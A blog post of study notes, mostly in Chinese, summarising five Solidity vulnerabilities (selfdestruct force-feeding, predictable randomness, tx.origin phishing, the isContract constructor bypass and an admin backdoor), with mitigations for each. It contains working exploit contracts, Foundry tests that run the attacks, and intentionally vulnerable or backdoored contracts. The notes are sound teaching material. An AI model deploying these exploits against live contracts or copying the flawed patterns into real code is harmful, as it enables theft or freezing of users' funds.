---
date: '2025-09-17T19:25:19+08:00'
title: 'Solidity Vulnerability Summary'
author: ["Zem"]
summary: "Selfdestruct、Randomness、Tx.origin Phishing、Bypass isContract、Hidden Backdoor in Contract"
tags: ["Solidity", "Foundry", "Vulnerability"]
series: ["学习笔记"]
---

## Selfdestruct

### Principle

` selfdestruct `执行后，合约代码被删除，并且余额会转给参数地址；

（以太坊经过Dencun升级后，调用`selfdestruct()`仅会转走ETH，不会销毁合约，**除非合约的创建和销毁在同一条交易记录中**；）；

由于转账**不触发 receive/fallback**，也不经过 checks-effects-interactions 流程，所以能“**强制充值**”任意数量的 ETH 到目标合约，从而**扰乱依赖 address(this).balance 的业务逻辑**；同时合约一旦被销毁，所有依赖其代码/存储的功能将永久失效，形成**拒绝服务**。

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint256 public constant targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        // @audit-info 每次只能转1 ETH
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // @audit hacker通过自毁函数将多余 ether转入，这样任何人拿不到rewards
        uint256 balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Test

Exp:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "src/Test.sol";

contract Exp {
    EtherGame eg;

    constructor(address addr) {
        eg = EtherGame(addr);
    }

    function Attack() public payable {
        // 自毁，同时向游戏合约转账
        selfdestruct(payable(address(eg)));
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";
import {EtherGame} from "src/Test.sol";
import {Exp} from "src/Exp.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    EtherGame eg;
    address alice;
    address hacker;
    Exp exp;

    function setUp() public {
        eg = new EtherGame();
        alice = makeAddr("alice");
        hacker = makeAddr("hacker");
        vm.deal(address(alice), 2 ether);
        vm.deal(address(hacker), 6 ether);
    }

    function test_dos() public {
        // alice deposit 1 ether
        vm.startPrank(alice);
        eg.deposit{value: 1 ether}();
        vm.stopPrank();
        vm.startPrank(hacker);
        exp = new Exp(address(eg));
        // hacker send 6 ether to EtherGame through Exp
        // now EtherGame has 7 ether
        exp.Attack{value: 6 ether}();
        console.log("Balance:", address(eg).balance);
        vm.stopPrank();
        vm.startPrank(alice);
        vm.expectRevert();
        // alice wants to get the reward
        // revert
        eg.deposit{value: 1 ether}();
        // no one can get the reward
        console.log("Balance:", address(eg).balance);
        vm.stopPrank();
    }
}

```

### Mitigation

不要依赖` this.balance `来追踪账户资金，使用storage或者变量来追踪资金，比如每次收到funds，在变量中加；



## Randomness

### Principle

若使用全局变量，比如` block.hash `、` block.number `、` block.timestamp `等是不安全的，可以被miner和attacker控制；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint256 _guess) public {
        // @audit 结果可以被操纵或者预测
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (_guess == answer) {
            (bool sent,) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}
```

### Test

Exp:

```solidity
contract Exp {
    GuessTheRandomNumber game;

    constructor(address addr) {
        game = GuessTheRandomNumber(addr);
    }

    function Attack() public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        game.guess(answer);
    }

    fallback() external payable {}
    receive() external payable {}
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";

import {GuessTheRandomNumber, Exp} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    GuessTheRandomNumber game;
    Exp exp;

    function setUp() public {
        game = new GuessTheRandomNumber();
        vm.deal(address(game), 1 ether);
        exp = new Exp(address(game));
    }

    function test_randomness() public {
        exp.Attack();
        console.log("Exp Balance:", address(exp).balance);
    }
}
```

### Mitigation

不要使用这些能被预测的全局变量作为随机数；



## Tx.origin Phishing

### Principle

` tx.origin `是一个全局变量，在solidity中使用这个变量来进行身份验证会导致被钓鱼；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        // @audit 攻击者可以诱导owner调用恶意函数来绕过检测
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

### Test

Exp:

```solidity
contract Exp {
    Wallet wallet;
    address owner;

    constructor(address addr) {
        wallet = Wallet(addr);
        owner = msg.sender;
    }

    function Attack() public {
        wallet.transfer(payable(owner), 10 ether);
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";

import {Wallet, Exp} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Wallet wallet;
    Exp exp;
    address owner;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        vm.deal(address(owner), 10 ether);
        vm.prank(owner);
        wallet = new Wallet{value: 10 ether}();
        attacker = makeAddr("attacker");
    }

    function test_tx_origin_phishing() public {
        vm.prank(attacker);
        exp = new Exp(address(wallet));
        // attacker phishing owner call the Attack() function
        vm.prank(owner, owner);
        exp.Attack();
        console.log("Attacker Balance:", attacker.balance);
    }
}
```

### Mitigation

建议使用` msg.sender `；



## Bypass isContract() validation

### Principle

` Solidity `中使用` extcodesize `来检测一个地址是否是合约还是EOA，但是有一个缺陷，在` constructor `执行的期间，这个检测返回的值是0；

所以，只需要在` constructor `期间调用目标函数，可以绕过检查；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Target {
    function isContract(address account) public view returns (bool) {
        uint256 size;
        assembly {
            // @audit 在constructor期间，返回的值是0
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
```

### Test

Exp

```solidity
contract Exp {
    Target target;

    constructor(address addr) {
        target = Target(addr);
        target.protected();
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import "forge-std/Vm.sol";

import {Target, Exp} from "src/Test.sol";

contract TestTest is Test {
    // Vm vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    Target target;
    Exp exp;

    function setUp() public {
        target = new Target();
    }

    function test_bypass_isContract() public {
        exp = new Exp(address(target));
        console.log("pwned: ", target.pwned());
    }
}
```

### Mitigation

1. 尽量通过业务逻辑限制权限，而不是凭调用者类型做判断；
2. 白名单和授权；
3. 签名 + EIP-712
4. 时间锁/延迟注册，让新注册的用户等几个区块才能使用功能



## Hidden Backdoor in Contract

### Principle

有的是有意识的添加了后门，影响可能是：供应商提款跑路，资产被劫持或冻结，数据泄漏和操纵等；

无意识的影响可能是：过度授权、逻辑缺陷、升级机制滥用等；

### Examples

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract LotteryGame {
    uint256 public prize = 1000;
    address public winner;
    address public admin = msg.sender;

    modifier safeCheck() {
        if (msg.sender == referee()) {
            _;
        } else {
            getkWinner();
        }
    }

    function referee() internal view returns (address user) {
        assembly {
            // load admin value at slot 2 of storage
            user := sload(2)
        }
    }

    function pickWinner(address random) public safeCheck {
        assembly {
            // @audit 管理员可随意指派winner
            sstore(1, random)
        }
    }

    function getkWinner() public view returns (address) {
        return winner;
    }
}
```

### Mitigation

1. 避免使用管理员模式，采用多签或者DAO治理控制关键函数；
2. 静动态双重审计；

